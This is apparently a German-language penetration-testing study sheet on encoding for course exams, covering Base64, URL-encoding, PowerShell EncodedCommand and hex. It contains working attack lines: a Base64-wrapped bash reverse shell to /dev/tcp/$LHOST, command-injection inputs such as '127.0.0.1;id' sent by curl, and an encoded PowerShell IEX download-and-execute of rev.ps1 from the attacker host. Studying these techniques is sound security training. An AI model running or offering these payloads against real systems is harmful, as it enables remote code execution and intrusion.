# 🔢 Encoding — URL, Base64, PowerShell

> **Hinweis Prof:** URL-Encoding und Base64 können vorkommen. Besonders wichtig bei Web-Command-Injection und curl-Payloads.

---

## Base64

```bash
# Encode ohne Zeilenumbruch
echo -n 'id;whoami' | base64 -w0

# Decode
echo 'aWQ7d2hvYW1p' | base64 -d
```

Command Injection mit Base64:

```bash
cmd="bash -i >& /dev/tcp/$LHOST/4444 0>&1"
b64=$(echo -n "$cmd" | base64 -w0)
echo $b64
# Target: echo <b64>|base64 -d|bash
```

---

## URL-Encoding

```bash
python3 -c "from urllib.parse import quote; print(quote('127.0.0.1;id'))"
python3 -c "from urllib.parse import unquote; print(unquote('127.0.0.1%3Bid'))"
```

Mit curl besser:

```bash
curl -G "http://$RHOST/ping" --data-urlencode 'host=127.0.0.1;id'
curl -X POST "http://$RHOST/run" --data-urlencode 'cmd=id && whoami'
```

> `--data-urlencode` nimmt dir die meisten Encoding-Probleme ab.

---

## PowerShell EncodedCommand

PowerShell braucht UTF-16LE:

```bash
cmd='whoami'
echo -n "$cmd" | iconv -t UTF-16LE | base64 -w0
```

Direkt als One-Liner:

```bash
ps='IEX(New-Object Net.WebClient).DownloadString("http://'$LHOST':8000/rev.ps1")'
enc=$(echo -n "$ps" | iconv -t UTF-16LE | base64 -w0)
echo "powershell -enc $enc"
```

---

## Hex / strings

```bash
echo -n 'string' | xxd -p
echo '737472696e67' | xxd -p -r
strings file.bin | grep -iE 'pass|user|key|token'
```

---

## CyberChef

Für schnelle Umwandlungen: Base64, URL Decode, Hex, XOR, Magic, gzip.
